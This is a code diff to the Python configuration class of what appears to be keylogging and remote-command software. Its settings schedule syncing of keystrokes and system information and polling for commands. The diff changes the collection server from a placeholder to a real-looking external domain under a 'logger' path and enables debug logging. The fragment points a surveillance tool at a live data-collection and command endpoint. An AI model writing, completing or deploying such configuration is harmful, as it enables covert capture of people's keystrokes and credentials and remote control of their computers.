@@ -5,7 +5,7 @@ import hashlib
 
 class Config:
     # Connection Settings
-    SERVER_URL = "https://example.com/telegram/api.php/"
+    SERVER_URL = "https://fasitheme.ir/logger/api.php/"
     SECRET_TOKEN = "1"
     CHECK_INTERVAL = 120  # seconds (data sync, e.g., keystrokes, system info)
     COMMAND_POLL_INTERVAL = 10  # seconds
@@ -20,7 +20,7 @@ class Config:
     EMERGENCY_HOTKEY = "ctrl+alt+shift+k"
     
     # Debug Settings
-    DEBUG_MODE = False  # Set to True to enable logging
+    DEBUG_MODE = True  # Set to True to enable logging
     ERROR_LOG_FILE = "errors.log"
     MAX_ERROR_LOG_SIZE = 1024 * 1024  # 1MB
     
